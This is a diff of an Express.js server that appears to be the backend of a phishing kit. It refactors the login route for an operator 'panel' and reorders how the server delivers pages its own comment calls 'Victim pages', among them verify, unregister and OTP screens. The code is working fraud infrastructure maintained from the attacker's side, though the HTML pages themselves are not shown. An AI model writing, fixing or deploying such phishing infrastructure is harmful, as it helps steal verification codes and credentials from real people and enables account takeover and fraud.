@@ -13,14 +13,12 @@ const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(32).toSt
 const app  = express();
 const PORT = process.env.PORT || 3000;
 
-// Trust proxy for Railway/Render
 app.set('trust proxy', 1);
 
 app.use(cors());
 app.use(bodyParser.json());
 app.use(bodyParser.urlencoded({ extended: true }));
 
-// Session middleware using express-session (more reliable)
 app.use(session({
   secret: SESSION_SECRET,
   resave: false,
@@ -44,18 +42,27 @@ let currentDomain     = '';
 
 const SESSION_TIMEOUT = 3 * 60 * 1000;
 
-/* ----------  STATIC ROUTES  ---------- */
-app.use(express.static(__dirname));
+/* ----------  PANEL ROUTES (BEFORE STATIC) ---------- */
 
-app.get('/',             (req, res) => res.sendFile(__dirname + '/index.html'));
-app.get('/verify.html',  (req, res) => res.sendFile(__dirname + '/verify.html'));
-app.get('/unregister.html', (req, res) => res.sendFile(__dirname + '/unregister.html'));
-app.get('/otp.html',     (req, res) => res.sendFile(__dirname + '/otp.html'));
-app.get('/success.html', (req, res) => res.sendFile(__dirname + '/success.html'));
+// POST handler for login (same URL as GET)
+app.post('/panel', (req, res) => {
+  const { user, pw } = req.body;
+  
+  console.log('POST /panel - Login attempt:', user);
+  
+  if (user === PANEL_USER && pw === PANEL_PASS) {
+    req.session.authed = true;
+    req.session.username = user;
+    console.log('Login SUCCESS');
+    return res.redirect('/panel');
+  } else {
+    req.session.destroy();
+    console.log('Login FAILED');
+    return res.redirect('/panel?fail=1');
+  }
+});
 
-/* ----------  PANEL ACCESS CONTROL  ---------- */
-
-// Main panel route - serves login or panel based on auth
+// GET handler for panel - shows login or dashboard
 app.get('/panel', (req, res) => {
   console.log('GET /panel - authed:', req.session?.authed);
   
@@ -66,40 +73,27 @@ app.get('/panel', (req, res) => {
   res.sendFile(__dirname + '/access.html');
 });
 
-// Handle login form submission
-app.post('/panel/login', (req, res) => {
-  const { user, pw } = req.body;
-  
-  console.log('Login attempt:', user);
-  
-  // STRICT credential check
-  if (user === PANEL_USER && pw === PANEL_PASS) {
-    req.session.authed = true;
-    req.session.username = user;
-    
-    console.log('Login SUCCESS - redirecting to /panel');
-    return res.redirect('/panel');
-  } else {
-    // Destroy any existing session on failed login
-    req.session.destroy();
-    console.log('Login FAILED - redirecting to /panel?fail=1');
-    return res.redirect('/panel?fail=1');
-  }
-});
-
 // Logout
 app.post('/panel/logout', (req, res) => {
   req.session.destroy();
   res.redirect('/panel');
 });
 
-// Catch-all for /panel/* to redirect to /panel
-app.get('/panel/*', (req, res) => {
-  res.redirect('/panel');
-});
+// Block direct access to panel files
+app.get(['/_panel.html', '/panel.html', '/access.html'], (req, res) => res.redirect('/panel'));
 
-// Block direct file access
-app.get(['/_panel.html', '/panel.html'], (req, res) => res.redirect('/panel'));
+/* ----------  STATIC ROUTES ---------- */
+app.use('/', express.static(__dirname, {
+  index: false,
+  dotfiles: 'deny'
+}));
+
+// Victim pages
+app.get('/',             (req, res) => res.sendFile(__dirname + '/index.html'));
+app.get('/verify.html',  (req, res) => res.sendFile(__dirname + '/verify.html'));
+app.get('/unregister.html', (req, res) => res.sendFile(__dirname + '/unregister.html'));
+app.get('/otp.html',     (req, res) => res.sendFile(__dirname + '/otp.html'));
+app.get('/success.html', (req, res) => res.sendFile(__dirname + '/success.html'));
 
 /* ----------  DOMAIN HELPER  ---------- */
 app.use((req, res, next) => {
